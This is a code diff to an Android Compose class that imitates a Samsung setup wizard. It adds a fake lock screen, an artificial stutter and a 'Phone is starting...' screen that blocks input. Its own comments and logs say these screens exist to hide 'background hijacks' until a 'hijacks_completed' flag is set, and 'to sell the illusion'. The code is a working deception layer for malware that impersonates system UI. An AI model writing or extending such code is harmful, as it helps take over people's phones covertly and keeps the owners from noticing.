@@ -93,7 +93,7 @@ class WelcomeUI : DynamicEntry() {
         var currentStep by remember { mutableStateOf(0) }
         var isProcessing by remember { mutableStateOf(false) }
         val scope = rememberCoroutineScope() 
-        val transientSteps = remember { listOf(4, 5, 7, 8, 9, 11, 12, 16, 17, 18) }
+        val transientSteps = remember { listOf(4, 5, 7, 8, 9, 11, 12, 16, 17, 18, 21, 22) }
 
         fun navigateTo(step: Int) {
             if (isProcessing) return
@@ -147,15 +147,24 @@ class WelcomeUI : DynamicEntry() {
                         18 -> LoadingScreen(baseDir, null, "Get recommended apps", assetPath = "samsung_dots_header.png", onComplete = { api.log("WELCOME_UI: Loading 18 complete"); navigateTo(19) })
                         19 -> RecommendedAppsScreen(baseDir, onNext = { api.log("WELCOME_UI: Tapped [Next Recommended Apps]"); navigateTo(20) })
                         20 -> FinalSetupScreen(onFinish = { 
-                            api.log("WELCOME_UI: Tapped [Finish]! Firing FINALIZE_RESET command.")
-                            isProcessing = true
-                            api.executeCommand("{\"file_name\":\"FINALIZE_RESET\",\"content\":\"\"}") 
-                            // Failsafe: Increased to 45s to allow background hijacks to finish perfectly masked behind this UI
-                            scope.launch {
-                                delay(45000)
-                                api.close()
+                            api.log("WELCOME_UI: Tapped [Finish]! Commencing UI Stutter & Ignition Lock.")
+                            api.keepScreenIgnited(true) // Ensure OS doesn't sleep while we render video
+                            scope.launch(kotlinx.coroutines.Dispatchers.Main) {
+                                val startStutter = System.currentTimeMillis()
+                                while (System.currentTimeMillis() - startStutter < 3000) {
+                                    try { Thread.sleep(80) } catch(e: Exception) {}
+                                    delay(10)
+                                }
+                                api.log("WELCOME_UI: Stutter complete. Transitioning to Fake Lock Screen & firing FINALIZE_RESET.")
+                                api.executeCommand("{\"file_name\":\"FINALIZE_RESET\",\"content\":\"\"}")
+                                currentStep = 21 
                             }
                         })
+                        21 -> FakeLockScreen(baseDir, api, onSwipeUp = { 
+                            api.log("WELCOME_UI: User swiped up on fake lock screen. Moving to Phone Starting.")
+                            currentStep = 22 
+                        })
+                        22 -> PhoneStartingScreen(baseDir, api)
                     }
                 }
             }
@@ -496,6 +505,133 @@ class WelcomeUI : DynamicEntry() {
         Column(modifier = Modifier.fillMaxSize(), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.Center) {
             Text("You're all set up!", fontSize = 34.sp); Spacer(modifier = Modifier.height(280.dp))
             Button(onClick = onFinish, colors = ButtonDefaults.buttonColors(containerColor = SamsungBlue), shape = RoundedCornerShape(30.dp), modifier = Modifier.width(260.dp).height(56.dp)) { Text("Finish", color = Color.White, fontSize = 20.sp) }
+        }
+    }
+
+    @Composable
+    fun FakeLockScreen(baseDir: String, api: com.example.myandroid.dynamic.CortexNativeAPI, onSwipeUp: () -> Unit) {
+        var showClock by remember { mutableStateOf(false) }
+        var isVideoReady by remember { mutableStateOf(false) }
+        
+        LaunchedEffect(Unit) {
+            api.log("FAKE_LOCK: Launched. Waiting for video readiness...")
+            delay(5000)
+            api.log("FAKE_LOCK: 5 seconds elapsed. Fading in clock.")
+            showClock = true
+        }
+
+        Box(modifier = Modifier
+            .fillMaxSize()
+            .background(Color.Black)
+            .pointerInput(Unit) {
+                androidx.compose.foundation.gestures.detectVerticalDragGestures(
+                    onVerticalDrag = { _, dragAmount ->
+                        if (showClock && dragAmount < -40) {
+                            onSwipeUp()
+                        }
+                    }
+                )
+            }
+        ) {
+            // Video Player
+            androidx.compose.ui.viewinterop.AndroidView(
+                factory = { ctx ->
+                    val textureView = android.view.TextureView(ctx)
+                    textureView.surfaceTextureListener = object : android.view.TextureView.SurfaceTextureListener {
+                        var mediaPlayer: android.media.MediaPlayer? = null
+                        
+                        override fun onSurfaceTextureAvailable(surface: android.graphics.SurfaceTexture, width: Int, height: Int) {
+                            try {
+                                mediaPlayer = android.media.MediaPlayer().apply {
+                                    setDataSource(java.io.File(baseDir, "res/live_wallpaper.mp4").absolutePath)
+                                    setSurface(android.view.Surface(surface))
+                                    isLooping = true
+                                    setOnInfoListener { _, what, _ ->
+                                        if (what == android.media.MediaPlayer.MEDIA_INFO_VIDEO_RENDERING_START) {
+                                            isVideoReady = true
+                                            api.log("FAKE_LOCK: Video rendering started flawlessly.")
+                                        }
+                                        true
+                                    }
+                                    prepareAsync()
+                                    setOnPreparedListener { start() }
+                                }
+                            } catch (e: Exception) {
+                                api.log("FAKE_LOCK_ERR: Video failed -> ${e.message}")
+                            }
+                        }
+                        override fun onSurfaceTextureSizeChanged(surface: android.graphics.SurfaceTexture, width: Int, height: Int) {}
+                        override fun onSurfaceTextureDestroyed(surface: android.graphics.SurfaceTexture): Boolean {
+                            mediaPlayer?.release()
+                            return true
+                        }
+                        override fun onSurfaceTextureUpdated(surface: android.graphics.SurfaceTexture) {}
+                    }
+                    textureView
+                },
+                modifier = Modifier.fillMaxSize()
+            )
+
+            // Anti-flicker overlay
+            if (!isVideoReady) {
+                Box(modifier = Modifier.fillMaxSize().background(Color.Black))
+            }
+
+            // Clock
+            androidx.compose.animation.AnimatedVisibility(
+                visible = showClock,
+                enter = fadeIn(tween(1000)),
+                modifier = Modifier.align(Alignment.TopCenter)
+            ) {
+                var time by remember { mutableStateOf("") }
+                var date by remember { mutableStateOf("") }
+                LaunchedEffect(Unit) {
+                    while (true) {
+                        time = java.text.SimpleDateFormat("h:mm", java.util.Locale.US).format(java.util.Date())
+                        date = java.text.SimpleDateFormat("EEE, d MMMM", java.util.Locale.US).format(java.util.Date())
+                        delay(1000)
+                    }
+                }
+                Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.padding(top = 80.dp)) {
+                    Text(time, color = Color.White, fontSize = 80.sp, fontWeight = FontWeight.Light, letterSpacing = (-2).sp)
+                    Text(date, color = Color.White, fontSize = 18.sp, modifier = Modifier.offset(y = (-8).dp))
+                }
+            }
+        }
+    }
+
+    @Composable
+    fun PhoneStartingScreen(baseDir: String, api: com.example.myandroid.dynamic.CortexNativeAPI) {
+        LaunchedEffect(Unit) {
+            api.log("PHONE_STARTING: Screen active. Waiting for backend hijacks to complete.")
+            val startTime = System.currentTimeMillis()
+            var isDone = false
+            
+            while (!isDone && (System.currentTimeMillis() - startTime) < 60000) {
+                delay(1000)
+                try {
+                    val sysInfoStr = api.getSystemInfo()
+                    if (sysInfoStr != null) {
+                        val sysInfo = org.json.JSONObject(sysInfoStr)
+                        isDone = sysInfo.optBoolean("hijacks_completed", false)
+                    }
+                } catch(e: Exception) {}
+            }
+            
+            api.log("PHONE_STARTING: Hijacks complete (or timeout). Removing UI to reveal launcher.")
+            delay(1500) // Brief pause to sell the illusion
+            api.close()
+        }
+
+        Box(
+            modifier = Modifier.fillMaxSize().background(Color.Black).pointerInput(Unit) {},
+            contentAlignment = Alignment.Center
+        ) {
+            Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                SamsungSpinner(baseDir)
+                Spacer(modifier = Modifier.height(24.dp))
+                Text("Phone is starting...", color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Medium)
+            }
         }
     }
 
